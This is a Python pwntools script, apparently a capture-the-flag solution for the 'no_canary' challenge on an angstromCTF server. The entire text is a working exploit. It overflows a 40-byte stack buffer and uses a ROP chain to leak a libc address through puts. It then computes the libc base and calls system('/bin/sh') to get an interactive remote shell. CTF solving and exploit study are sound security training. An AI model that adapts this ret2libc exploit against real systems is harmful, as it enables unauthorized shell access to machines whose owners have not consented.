from pwn import *

p=remote("shell.actf.co",20700)
#p=process("./no_canary")
flag=0x000000000040118a
system_plt=0x0000000000401050
setresgid_got=0x0000000000404020
pop_rdi=0x0000000000401343
puts=0x0000000000401030
main=0x0000000000401199
payload=""
payload+="A"*40
payload+=p64(pop_rdi)
payload+=p64(setresgid_got)
payload+=p64(puts)
payload+=p64(main)


p.sendline(payload)
p.recvuntil("meet you,")
p.recvline()
data=p.recvline()[:-1]
leak=u64(data.ljust(8,"\x00"))
print "leak:",hex(leak)
base=leak-0x0cd5f0
binsh=base+0x18cd57
system=base+0x045390

payload=""
payload+="A"*40
payload+=p64(pop_rdi)
payload+=p64(binsh)
payload+=p64(system)
payload+=p64(0x000000000040101a)
p.sendline(payload)
p.interactive()













